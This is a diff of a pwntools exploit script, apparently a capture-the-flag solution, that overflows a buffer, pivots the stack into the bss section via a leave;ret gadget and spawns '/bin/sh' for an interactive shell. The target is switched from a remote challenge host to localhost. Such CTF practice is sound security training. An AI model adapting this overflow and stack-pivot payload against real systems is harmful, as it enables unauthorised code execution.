@@ -13,8 +13,8 @@ context.binary = exe
 host = "83.136.252.214"
 port = 56736
 
-# host = "localhost"
-# port = 1337
+host = "localhost"
+port = 1337
 
 def start_local(argv=[], *a, **kw):
     '''Execute the target binary locally'''
@@ -62,23 +62,30 @@ c
 
 io = start()
 
-# --- good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :) ---
+# # --- good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :) ---
 
 ret = 0x401184
-leave_ret = 0x0000000000401183 #: leave ; ret
+leave_ret = 0x401183
 padding_len = 0x20
 
-cmd = b"/bin/sh\x00"
-cmd = cmd + b"a"*(padding_len-len(cmd))
+cmd_padding = b"/bin/sh\x00".ljust(padding_len, b"a")
 
+payload = flat(
+    cmd_padding,        # padding start with cmd
+    exe.bss()+0x800,    # rbp
+    0x401169,       # ret
+)
 
-sla(b">> ", b"a"*padding_len + p64(0x404800) + p64(exe.sym['main'] + 27))
-# => base = 0x404800, sp = large
+sla(b">> ", payload)
 
-sleep(3)
-sl(cmd + p64(0x404900+0x400) + p64(leave_ret) + b"a"*(0xf8+0x400) + p64(exe.sym['main'] + 19))
-# main leave ret => base = 0x404a00, sp = 0x404800
-# mali leave ret => base = 0x404a00, sp = 0x404a00
+# sla(b">> ", b"a"*padding_len + p64(0x404800) + p64(exe.sym['main'] + 27))
+# # => base = 0x404800, sp = large
+
+# sleep(3)
+# sl(cmd + p64(0x404900+0x400) + p64(leave_ret) + b"a"*(0xf8+0x400) + p64(exe.sym['main'] + 19))
+# # main leave ret => base = 0x404a00, sp = 0x404800
+# # mali leave ret => base = 0x404a00, sp = 0x404a00
 
 io.interactive()
+
 
